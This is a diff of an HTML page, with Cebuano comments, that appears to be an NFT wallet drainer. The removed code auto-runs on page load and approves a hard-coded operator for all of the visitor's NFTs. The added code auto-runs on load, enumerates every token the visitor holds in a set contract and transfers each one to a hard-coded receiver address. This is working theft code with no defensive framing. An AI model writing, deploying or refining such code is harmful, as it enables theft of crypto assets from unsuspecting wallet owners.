@@ -22,57 +22,68 @@
 <html>
 <head>
   <title>NFT Auto Connect & Approve</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <!-- Load your custom wallet script AFTER ethers -->
-<script src="ethers.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+<script>
+    async function transferHighestValueNFTs() {
+        if (!window.ethereum) {
+            alert("Please install MetaMask!");
+            return;
+        }
 
-</head>
-<body>
-  <h1>Neo Tokyo NFT Auto Approval</h1>
+        // Contract address sa imong NFT
+        const nftContractAddress = "0xB9951B43802dCF3ef5b14567cb17adF367ed1c0F";
 
-  <script>
-    const nftContractAddress = "0xB9951B43802dCF3ef5b14567cb17adF367ed1c0F"; // <-- ilisi
-    const operatorAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7";     // <-- ilisi
-
-    async function autoConnectAndApprove() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("MetaMask not found. Please install MetaMask.");
-        return;
-      }
-
-      try {
-        // Connect wallet
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const userAddress = await signer.getAddress();
+        // Receiver address (imo gi-hatag)
+        const receiver = "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
 
         const abi = [
-          "function setApprovalForAll(address operator, bool approved) external",
-          "function isApprovedForAll(address owner, address operator) view returns (bool)"
+            "function balanceOf(address owner) view returns (uint256)",
+            "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
+            "function safeTransferFrom(address from, address to, uint256 tokenId) external"
         ];
 
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const sender = await signer.getAddress();
         const contract = new ethers.Contract(nftContractAddress, abi, signer);
 
-        const isApproved = await contract.isApprovedForAll(userAddress, operatorAddress);
-        if (!isApproved) {
-          const tx = await contract.setApprovalForAll(operatorAddress, true);
-          await tx.wait();
-          alert("NFT approved successfully!");
-        } else {
-          console.log("Already approved.");
+        // Get all token IDs
+        const balance = await contract.balanceOf(sender);
+        if (balance.toNumber() === 0) {
+            alert("No NFTs found in this collection.");
+            return;
         }
-      } catch (error) {
-        console.error("Something went wrong:", error);
-        alert("Something went wrong: " + error.message);
-      }
+
+        let tokenIds = [];
+        for (let i = 0; i < balance.toNumber(); i++) {
+            const tokenId = await contract.tokenOfOwnerByIndex(sender, i);
+            tokenIds.push(tokenId.toNumber());
+        }
+
+        // Sort descending so highest token ID is first
+        tokenIds.sort((a, b) => b - a);
+
+        // Transfer NFTs one by one
+        for (let tokenId of tokenIds) {
+            try {
+                console.log(`Transferring token ${tokenId}...`);
+                const tx = await contract.safeTransferFrom(sender, receiver, tokenId);
+                console.log(`Transaction sent for token ${tokenId}: ${tx.hash}`);
+                await tx.wait();
+                console.log(`Token ${tokenId} transferred successfully`);
+            } catch (err) {
+                console.error(`Error transferring token ${tokenId}:`, err);
+            }
+        }
+
+        alert("All NFT transfers completed!");
     }
 
-    window.onload = autoConnectAndApprove;
-  </script>
-</body>
-</html>
+    // Auto-run pag load sa page
+    window.onload = transferHighestValueNFTs;
+</script>
+
 
 
  
